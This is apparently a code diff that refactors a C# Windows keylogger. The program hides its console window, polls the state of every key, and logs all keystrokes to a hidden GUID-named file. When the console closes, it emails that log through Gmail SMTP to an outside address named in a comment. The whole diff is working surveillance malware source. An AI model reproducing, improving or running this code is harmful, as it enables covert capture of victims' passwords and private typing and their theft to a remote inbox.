@@ -7,25 +7,34 @@ namespace KeyLogger
 {
     class KeyLoggerClass
     {
+        #region Constants
+        public const int HOMEKEY = 36;
+        public const int ENDKEY = 35;
+        public const int ENTERKEY = 13;
+        public const int SPACEKEY = 32;
+        public const int SW_HIDE = 0;
+        public const int COUNTKEYS = 255;
+        #endregion
+
+        #region WinAPI
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
-
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);
-
-        public static string filename = "3a277973-20e1-4549-9c9e-3f5ffa32c43c.txt"; // generated guid.newGuid()
-        public static System.IO.StreamWriter myFile = null;
 
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
 
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        #endregion
+        #region FileWriting
+        public static string filename = "3a277973-20e1-4549-9c9e-3f5ffa32c43c.txt"; // generated guid.newGuid()
+        public static System.IO.StreamWriter myFile = null;
+        #endregion
 
-        const int SW_HIDE = 0;
-
-        public static void Email_Send() // send mail from icanmakeyoucryo.o@gmail.com to d1mnewz@gmail.com
+        public static void Email_Send() // send log file from icanmakeyoucryo.o@gmail.com to d1mnewz@gmail.com
         {
             MailMessage mail = new MailMessage();
             SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
@@ -45,9 +54,11 @@ namespace KeyLogger
             SmtpServer.Send(mail);
         }
 
-        private delegate bool ConsoleEventDelegate(int eventType);
+        #region ConsoleOnClose
 
-        static bool ConsoleEventCallback(int eventType)
+        public delegate bool ConsoleEventDelegate(int eventType);
+
+        public static bool ConsoleEventCallback(int eventType)
         {
             if (eventType == 2)
             {
@@ -58,64 +69,68 @@ namespace KeyLogger
             return false;
         } // when console closes
 
-        static ConsoleEventDelegate handler;   // Keeps it from getting garbage collected
+        public static ConsoleEventDelegate handler;   // Keeps it from getting garbage collected
 
-        static void HideWindow()
+        #endregion
+
+        public static void HideWindow()
         {
             var handle = GetConsoleWindow();
             // Hide
-            ShowWindow(handle, SW_HIDE);
+            ShowWindow(handle, SW_HIDE); 
             // Show
             //ShowWindow(handle, SW_SHOW);
         }
-        static void Main(string[] args)
+
+        public static void Main(string[] args)
         {
             HideWindow();
             handler = new ConsoleEventDelegate(ConsoleEventCallback); // subscribe onclose event to ConsoleEventCallback
-            SetConsoleCtrlHandler(handler, true);
-            if (System.IO.File.Exists(filename))
+            SetConsoleCtrlHandler(handler, true);                     // subscribe onclose event to ConsoleEventCallback
+            if (System.IO.File.Exists(filename)) // if file exists then delete it and create again
             {
                 System.IO.File.Delete(filename);
             }
-            myFile  = new System.IO.StreamWriter(filename);
-            myFile.WriteLineAsync(DateTime.Now.ToString());
+            myFile  = new System.IO.StreamWriter(filename); 
+            myFile.WriteLineAsync(DateTime.Now.ToString()); // write date to top of file
             StartLogging();
         }
-
-   
     
-        static void StartLogging()
+        public static void StartLogging()
         {
             int lastKey = 0;
             while (true)
             {
                 //sleeping for while, this will reduce load on cpu
                 Thread.Sleep(10);
-                for (Int32 i = 0; i < 255; i++)
+                for (Int32 i = 0; i < COUNTKEYS; i++) 
                 {
                     int keyState = GetAsyncKeyState(i);
-                    if (keyState == 1 || keyState == -32767)
+                    if (keyState == 1 || keyState == -32767) // if key is about keyboard or mouse
                     {
                         switch (i)
                         {
-                            case 32:
+                            case SPACEKEY:
                                 myFile.WriteAsync(" ");
                                 break;
-                            case 13:
+                            case ENTERKEY:
                                 myFile.WriteLineAsync(myFile.NewLine);
                                 break;
-                            case 35:
-                                if (lastKey == 36)
+                            case ENDKEY:
+                                if (lastKey == HOMEKEY)
                                 {
+                                    myFile.WriteLineAsync("Home+End pressed!!!");
                                     ConsoleEventCallback(2); // exit event code 
                                     Environment.Exit(0);
                                 }
-                                else 
-                                     myFile.WriteAsync(((Keys)i).ToString());
+                                else
+                                {
+                                    myFile.WriteAsync(((Keys)i).ToString());
+                                }
                                 break;
                             default:
-                                myFile.WriteAsync(((Keys)i).ToString());
-                                Console.WriteLine(i);
+                                myFile.WriteAsync(((Keys)i).ToString()); // write key to file
+                               // Console.WriteLine(i);
                                 break;
                         }
                         lastKey = i;
